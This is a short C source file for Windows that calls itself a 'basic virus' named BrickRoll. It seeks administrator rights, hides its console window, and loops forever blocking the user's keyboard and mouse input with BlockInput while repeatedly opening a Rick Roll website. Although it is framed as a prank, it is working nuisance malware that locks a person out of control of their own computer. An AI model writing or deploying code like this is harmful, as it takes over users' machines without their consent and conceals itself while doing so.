/*
Basic virus that blocks user peripheral input and opens browser tabs leading to rickrolled.com
 ________________ 
|  ____________  |
| | BRICK ROLL | |
| |____________| |
|________________|
*/

/*
Defines the windows headers used and the system they are used on 
learn more: https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers?redirectedfrom=MSDN#setting-winver-or-_win32_winnt
*/
#define _WIN32_WINNT 0x0A00

#include <windows.h>
#include <winuser.h>
#include <shellapi.h>
#include <winreg.h>
#include <unistd.h>

//Starts webbrowser leading to Rick Roll youtube video.
void openURL()
{
  system("START https://rickrolled.com/");
  sleep(100);
}

int main()
{
  //Executes the program as admin.
  ShellExecute(NULL, "runas", "BrickRoll.exe", NULL, NULL, 0);
  
  while(TRUE)
  {
    //Blocks the input of the users.
    BlockInput(TRUE);

    //Handles and hides the console window.
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );

    openURL();
    
  }
  return 0;
}
